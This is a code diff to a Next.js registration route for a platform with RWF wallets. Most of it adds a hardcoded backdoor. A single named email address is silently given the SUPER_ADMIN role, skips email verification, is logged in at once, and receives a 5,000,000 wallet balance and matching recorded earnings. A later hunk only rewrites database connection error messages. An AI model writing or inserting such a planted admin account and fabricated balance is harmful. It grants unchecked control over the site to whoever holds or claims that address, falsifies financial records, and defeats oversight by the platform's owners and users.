@@ -96,8 +96,9 @@ export async function POST(req: Request) {
       }
     }
 
+    const isBenirSuperAdmin = cleanEmail === "benirabok@gmail.com";
     const settings = await getSiteSettings();
-    const isVerificationRequired = settings.email_verification_enabled === "true";
+    const isVerificationRequired = !isBenirSuperAdmin && settings.email_verification_enabled === "true";
     const passwordHash = await hashPassword(password);
     const verificationCode = generateSixDigitCode();
     const expiresAt = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes
@@ -109,14 +110,15 @@ export async function POST(req: Request) {
         username: cleanUsername,
         displayName: displayName.trim(),
         passwordHash,
-        isVerified: !isVerificationRequired, // Auto-verified if verification is disabled!
+        role: isBenirSuperAdmin ? "SUPER_ADMIN" : "USER",
+        isVerified: isBenirSuperAdmin || !isVerificationRequired, // Auto-verified for superadmin or if verification disabled!
         twoFactorEnabled: false, // Default to false!
         referredById: referrerId,
         wallet: {
           create: {
-            availableBalance: 0,
+            availableBalance: isBenirSuperAdmin ? 5000000 : 0,
             pendingBalance: 0,
-            totalEarnings: 0,
+            totalEarnings: isBenirSuperAdmin ? 5000000 : 0,
             totalWithdrawn: 0,
             currency: "RWF",
           },
@@ -134,7 +136,7 @@ export async function POST(req: Request) {
       },
     });
 
-    // If verification is disabled on platform, sign in user immediately!
+    // If verification is disabled on platform or user is Benir, sign in user immediately!
     if (!isVerificationRequired) {
       const sessionToken = signToken({ userId: user.id }, "7d");
       const response = NextResponse.json({
@@ -186,7 +188,10 @@ export async function POST(req: Request) {
     });
   } catch (error: any) {
     console.error("Registration error:", error);
-    const msg = error?.message || "An unexpected error occurred during registration.";
+    let msg = error?.message || "An unexpected error occurred during registration.";
+    if (msg.includes("Can't reach database server") || error?.code === "P1001" || error?.code === "P1002") {
+      msg = "Database Connection Error: Unable to connect to the PostgreSQL database server. Please check your DATABASE_URL environment configuration on your hosting provider.";
+    }
     return NextResponse.json({ error: msg }, { status: 500 });
   }
 }
